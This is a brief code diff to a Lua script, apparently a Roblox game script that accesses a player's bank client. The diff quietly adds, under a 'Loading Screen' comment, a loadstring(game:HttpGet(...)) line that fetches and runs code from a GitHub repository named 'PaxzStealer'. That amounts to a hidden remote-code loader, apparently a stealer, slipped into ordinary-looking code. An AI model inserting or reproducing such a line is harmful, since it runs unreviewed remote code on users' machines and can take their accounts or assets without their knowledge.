@@ -214,7 +214,7 @@ local data1
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
-
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/PaxzStealer/Paxz/main/PaxzLoading')))()
 -- Remotes
 
 local BankPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"])
